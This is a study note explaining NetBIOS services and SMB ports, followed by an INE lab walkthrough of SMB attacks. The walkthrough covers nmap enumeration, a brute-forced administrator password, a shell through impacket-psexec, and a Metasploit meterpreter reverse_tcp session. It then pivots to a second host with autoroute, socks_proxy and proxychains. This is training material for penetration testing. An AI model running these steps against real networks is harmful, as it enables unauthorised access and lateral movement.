- NetBIOS and SMB are two different technologies, but they are related in the context of networking and file sharing on Windows networks.

- NetBIOS is an API and a set of network protocols for providing communication services over a local network. Used primarily to allow applications on different computers to find and interact with each other on a network.
- NetBIOS offers 3 primary services:
	1. Name Service (NetBIOS-NS): Allows computers to register, unregister and resolve names in local network. Port 137.
	2. Datagram Service (NetBIOS-DGM): Supports connectionless communication and broadcasting. Port 138.
	3. Session Service (NetBIOS-SSN): Supports connection-oriented communication for more reliable data transfers. Port 139.

- SMB is a network file sharing protocol that allows computers on a network to share files, printers and other resources. SMB generally uses port 445 for direct SMB traffic or 139 when operating with NetBIOS.

---

[LAB]

- 2 targets: demo.ine.local and demo1.ine.local
- The first target is accessible but the second is not and we will need to PIVOT to reach the other machine.

```bash
SMB Version:
nmap -p445 --script smb-protocols demo.ine.local

SMB Security level:
nmap -p445 --script smb-security-mode demo.ine.local

Testing anonymous auth:
smbclient -L demo.ine.local (NO password)

SMB Enum Users:
nmap -p445 --script smb-enum-users.nse demo.ine.local
```

-  Brute force attack on SMB service: administrator:password1
```bash
> impacket-psexec administrator@10.2.24.142
Shell gained.
Lets get a meterpreter session

> msfconsole -q
> use windows/smb/psexec
> set payload windows/x64/meterpreter/reverse_tcp
> set OPTIONS
> run

> We can now ping the second target.

> run autoroute -s 10.2.18.114 (Second target)
> background

> search socks_proxy
> use 0
> set VERSION 4a
> set SRVPORT 9050 (From /etc/proxychain4.conf)

> proxychains nmap demo1.ine.local
```